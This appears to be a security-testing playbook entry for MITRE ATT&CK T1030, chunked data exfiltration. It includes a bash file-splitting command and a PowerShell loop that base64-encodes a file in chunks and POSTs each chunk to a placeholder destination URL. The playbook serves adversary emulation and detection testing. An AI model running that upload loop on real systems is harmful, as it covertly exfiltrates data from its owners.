---
name: "T1030_data-transfer-size-limits"
description: "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds."
category: "client-side"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1030
  - exfiltration
  - linux
  - macos
  - windows
  - esxi
technique_id: "T1030"
tactic: "exfiltration"
all_tactics:
  - exfiltration
platforms:
  - Linux
  - macOS
  - Windows
  - ESXi
mitre_url: "https://attack.mitre.org/techniques/T1030"
tech_stack:
  - linux
  - macos
  - windows
  - esxi
cwe_ids:
  - CWE-200
chains_with: []
prerequisites: []
severity_boost: {}
---

# T1030 Data Transfer Size Limits

## High-Level Description

An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.

## Kill Chain Phase

- Exfiltration (TA0010)

**Platforms:** Linux, macOS, Windows, ESXi

## What to Check

- [ ] Identify if Data Transfer Size Limits technique is applicable to target environment
- [ ] Check Linux systems for indicators of Data Transfer Size Limits
- [ ] Check macOS systems for indicators of Data Transfer Size Limits
- [ ] Check Windows systems for indicators of Data Transfer Size Limits
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Data Transfer Size Limits

Take a file/directory, split it into 5Mb chunks

**Supported Platforms:** macos, linux

```bash
cd #{folder_path}; split -b 5000000 #{file_name}
ls -l #{folder_path}
```

**Dependencies:**

- The file must exist for the test to run.

### Atomic Test 2: Network-Based Data Transfer in Small Chunks

Simulate transferring data over a network in small chunks to evade detection.

**Supported Platforms:** windows

```powershell
$file = [System.IO.File]::OpenRead(#{source_file_path})
$chunkSize = #{chunk_size} * 1KB
$buffer = New-Object Byte[] $chunkSize

while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk
}
$file.Close()
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Data Transfer Size Limits by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1030 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1031 Network Intrusion Prevention

Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.

## Detection

### Detection Strategy for Data Transfer Size Limits and Chunked Exfiltration

## Risk Assessment

| Finding                                        | Severity | Impact       |
| ---------------------------------------------- | -------- | ------------ |
| Data Transfer Size Limits technique applicable | Low      | Exfiltration |

## CWE Categories

| CWE ID  | Title                             |
| ------- | --------------------------------- |
| CWE-200 | Exposure of Sensitive Information |

## References

- [University of Birmingham C2](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)
- [Atomic Red Team - T1030](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1030)
- [MITRE ATT&CK - T1030](https://attack.mitre.org/techniques/T1030)
